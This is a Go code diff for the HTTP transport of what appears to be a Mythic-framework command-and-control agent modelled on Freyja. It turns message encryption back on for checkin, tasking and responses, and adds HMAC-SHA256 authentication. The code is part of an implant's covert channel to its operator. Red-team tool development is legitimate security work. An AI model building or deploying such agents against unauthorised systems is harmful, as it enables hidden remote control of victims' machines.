@@ -4,7 +4,9 @@ import (
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/hmac"
 	"crypto/rand"
+	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
@@ -86,11 +88,10 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 
 	// Encrypt if encryption key is provided
 	if h.EncryptionKey != "" {
-		// Temporarily disable encryption to debug communication
+		body = h.encryptMessage(body)
 		if h.Debug {
-			log.Printf("[DEBUG] Encryption temporarily disabled for debugging")
+			log.Printf("[DEBUG] Checkin message encrypted")
 		}
-		// body = h.encryptMessage(body)
 	}
 
 	// Send using Freyja-style format: UUID + JSON, then base64 encode
@@ -130,11 +131,10 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 
 	// Encrypt if encryption key is provided
 	if h.EncryptionKey != "" {
-		// Temporarily disable encryption to debug communication
+		body = h.encryptMessage(body)
 		if h.Debug {
-			log.Printf("[DEBUG] Encryption temporarily disabled for debugging")
+			log.Printf("[DEBUG] Tasking message encrypted")
 		}
-		// body = h.encryptMessage(body)
 	}
 
 	// Send using Freyja-style format: UUID + JSON, then base64 encode
@@ -210,11 +210,10 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 
 	// Encrypt if encryption key is provided
 	if h.EncryptionKey != "" {
-		// Temporarily disable encryption to debug communication
+		body = h.encryptMessage(body)
 		if h.Debug {
-			log.Printf("[DEBUG] Encryption temporarily disabled for debugging")
+			log.Printf("[DEBUG] Response message encrypted")
 		}
-		// body = h.encryptMessage(body)
 	}
 
 	// Send using Freyja-style format: UUID + JSON, then base64 encode
@@ -276,7 +275,7 @@ func getString(m map[string]interface{}, key string) string {
 	return ""
 }
 
-// encryptMessage encrypts a message using AES-CBC (simplified like Freyja)
+// encryptMessage encrypts a message exactly like Freyja's AesEncrypt
 func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
 	if h.EncryptionKey == "" {
 		return msg
@@ -313,19 +312,39 @@ func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
 	mode := cipher.NewCBCEncrypter(block, iv)
 	
 	// Pad the message to block size
-	padded := pkcs7Pad(msg, aes.BlockSize)
+	padded, err := pkcs7Pad(msg, aes.BlockSize)
+	if err != nil {
+		if h.Debug {
+			log.Printf("[DEBUG] Failed to pad message: %v", err)
+		}
+		return msg
+	}
 	
 	// Encrypt the message
 	encrypted := make([]byte, len(padded))
 	mode.CryptBlocks(encrypted, padded)
 	
-	// Return IV + encrypted data (let Mythic handle HMAC)
-	return append(iv, encrypted...)
+	// Freyja format: IV + Ciphertext
+	ivCiphertext := append(iv, encrypted...)
+	
+	// Create HMAC of IV + Ciphertext
+	hmacHash := hmac.New(sha256.New, key)
+	hmacHash.Write(ivCiphertext)
+	hmacBytes := hmacHash.Sum(nil)
+	
+	// Freyja format: IV + Ciphertext + HMAC
+	return append(ivCiphertext, hmacBytes...)
 }
 
-// pkcs7Pad adds PKCS#7 padding
-func pkcs7Pad(data []byte, blockSize int) []byte {
+// pkcs7Pad adds PKCS#7 padding (matching Freyja's implementation)
+func pkcs7Pad(data []byte, blockSize int) ([]byte, error) {
+	if blockSize <= 0 {
+		return nil, fmt.Errorf("invalid blocksize")
+	}
+	if data == nil || len(data) == 0 {
+		return nil, fmt.Errorf("invalid PKCS7 data (empty or not padded)")
+	}
 	padding := blockSize - len(data)%blockSize
 	padText := bytes.Repeat([]byte{byte(padding)}, padding)
-	return append(data, padText...)
+	return append(data, padText...), nil
 }
